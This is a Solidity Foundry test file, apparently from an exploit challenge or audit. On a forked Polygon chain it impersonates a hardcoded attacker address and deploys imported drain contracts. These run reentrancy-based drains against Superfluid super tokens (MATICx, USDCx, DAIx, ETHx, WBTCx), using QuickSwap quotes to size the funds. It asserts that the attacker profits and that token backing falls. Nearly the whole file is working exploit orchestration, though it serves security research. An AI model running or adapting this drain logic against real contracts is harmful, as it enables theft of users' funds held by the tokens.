// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5Drain, Ch5ERC20Drain} from "../exploit/Run.s.sol";

interface IERC20View47 {
    function balanceOf(address account) external view returns (uint256);
}

interface ISuperTokenView47 {
    function getUnderlyingToken() external view returns (address);
}

interface IQuickSwapRouter47 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

contract Attempt47FullRunLikeTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant ETHX = 0x27e1e4E6BC79D93032abef01025811B7E4727e85;
    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;

    uint256 internal constant NATIVE_REENTRY_COUNT = 10;
    uint256 internal constant NATIVE_PHASE1_ROUNDS = 4;
    uint256 internal constant NATIVE_GAS_RESERVE = 0.02 ether;
    uint256 internal constant NATIVE_BACKING_MARGIN = 1 gwei;

    uint256 internal constant MAX_REENTRY_COUNT = 10;
    uint256 internal constant GAS_RESERVE = 5 ether;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_full_run_like_broadcast_path() public {
        uint256 nativeBefore = ATTACKER.balance;
        uint256 nativeSeed = _computeNativeSeed(nativeBefore, MATICX.balance);

        vm.startPrank(ATTACKER);

        if (nativeSeed > 0) {
            Ch5Drain nativeDrain = new Ch5Drain();
            nativeDrain.executeRound{value: nativeSeed}(NATIVE_REENTRY_COUNT);

            for (uint256 i = 1; i < NATIVE_PHASE1_ROUNDS; ++i) {
                uint256 nextSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
                if (nextSeed == 0) break;
                nativeDrain.executeRound{value: nextSeed}(NATIVE_REENTRY_COUNT);
            }

            uint256 phase2Seed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
            if (phase2Seed > 0) {
                Ch5Drain nativePhase2Drain = new Ch5Drain();
                nativePhase2Drain.executeRound{value: phase2Seed}(NATIVE_REENTRY_COUNT);
            }
        }

        console.log("native after MATICx:", ATTACKER.balance);

        _drainToken("USDCx", USDCX, 820_000_000, 250 ether);
        _drainToken("DAIx", DAIX, 830_000_000, 250 ether);
        _drainToken("ETHx", ETHX, 835_000_000, 250 ether);
        _drainToken("WBTCx", WBTCX, 840_000_000, 250 ether);

        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance should strictly increase");
    }

    function _drainToken(string memory label, address superToken, uint32 indexBase, uint256 bootstrapFloor) internal {
        address underlying = ISuperTokenView47(superToken).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20View47(underlying).balanceOf(superToken);
        if (backingBefore <= 1) {
            console.log(label);
            console.log("backing already empty, skipping");
            return;
        }

        uint256 spendable = nativeBefore > GAS_RESERVE ? nativeBefore - GAS_RESERVE : 0;
        uint256 targetUnderlying = backingBefore / (MAX_REENTRY_COUNT + 2);
        uint256 bootstrapNative = _bootstrapForTargetUnderlying(underlying, targetUnderlying, spendable);
        if (bootstrapNative < bootstrapFloor) bootstrapNative = bootstrapFloor;
        if (bootstrapNative > spendable) bootstrapNative = spendable;

        console.log(label);
        console.log("native before token:", nativeBefore);
        console.log("backing before:", backingBefore);
        console.log("target underlying:", targetUnderlying);
        console.log("bootstrap native:", bootstrapNative);

        Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) = drain.executeDrain{value: bootstrapNative}(1, MAX_REENTRY_COUNT);

        uint256 nativeAfter = ATTACKER.balance;
        uint256 backingAfter = IERC20View47(underlying).balanceOf(superToken);

        console.log("rounds executed:", roundsExecuted);
        console.log("helper native out:", nativeOut);
        console.log("native delta:", nativeAfter - nativeBefore);
        console.log("backing after:", backingAfter);

        assertEq(roundsExecuted, 1, "expected exactly one round");
        assertGt(nativeAfter, nativeBefore, "token not profitable");
        assertLt(backingAfter, backingBefore, "backing did not decrease");
    }

    function _computeNativeSeed(uint256 attackerNative, uint256 maticxBackingBefore) internal pure returns (uint256) {
        if (attackerNative <= NATIVE_GAS_RESERVE) {
            return 0;
        }

        uint256 spendable = attackerNative - NATIVE_GAS_RESERVE;
        uint256 safeByBacking = maticxBackingBefore / NATIVE_REENTRY_COUNT;
        if (safeByBacking <= NATIVE_BACKING_MARGIN) {
            return 0;
        }

        unchecked {
            safeByBacking -= NATIVE_BACKING_MARGIN;
        }

        return spendable < safeByBacking ? spendable : safeByBacking;
    }

    function _bootstrapForTargetUnderlying(address underlying, uint256 targetUnderlying, uint256 maxNative)
        internal
        view
        returns (uint256 bootstrapNative)
    {
        if (targetUnderlying == 0 || maxNative == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WMATIC;
        path[1] = underlying;

        uint256 quotedMax = IQuickSwapRouter47(ROUTER).getAmountsOut(maxNative, path)[1];
        if (quotedMax <= targetUnderlying) {
            return maxNative;
        }

        uint256 low = 1;
        uint256 high = maxNative;
        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quoted = IQuickSwapRouter47(ROUTER).getAmountsOut(mid, path)[1];
            if (quoted >= targetUnderlying) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        bootstrapNative = low + (low / 20) + 0.1 ether;
    }
}
